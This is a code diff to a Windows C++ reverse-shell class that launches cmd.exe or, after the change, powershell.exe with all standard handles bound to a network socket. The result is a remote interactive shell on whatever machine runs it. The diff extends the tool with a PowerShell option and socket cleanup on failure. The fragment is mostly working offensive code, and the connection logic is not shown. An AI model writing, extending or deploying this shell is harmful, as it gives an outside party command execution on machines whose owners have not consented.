@@ -5,17 +5,21 @@
 #include "windows.h"
 #include "iostream"
 
+#define WIN_CMD	0x00
+#define WIN_PWS	0x02
+ 
 class Reverseshell{
 	
 	public:
-		HANDLE get( Socket * sock );
+		HANDLE get( Socket * sock, int type );
 };
 
-HANDLE Reverseshell::get( Socket * sock ){
-	
+HANDLE Reverseshell::get( Socket * sock, int type ){
+
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
 	HANDLE ret;
+	LPSTR exec;
 	
 	ret = 0;
 	
@@ -27,9 +31,15 @@ HANDLE Reverseshell::get( Socket * sock ){
 	si.dwFlags = STARTF_USESTDHANDLES;
 	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock->get();
 	
+	if( type == WIN_PWS )
+	exec = (LPSTR )"powershell.exe";
+	else{
+		exec = (LPSTR )"cmd.exe";
+	}
+	
 	if( CreateProcess(
 		NULL,
-		(LPSTR)"cmd.exe",
+		exec,
 		NULL,
 		NULL,
 		true,
@@ -42,7 +52,9 @@ HANDLE Reverseshell::get( Socket * sock ){
 		WaitForSingleObject( pi.hProcess, INFINITE );
 		CloseHandle( pi.hProcess );
 		CloseHandle( pi.hThread );
-		
+	
+	}else{
+		sock->Close();
 	}
 	
 return ret;
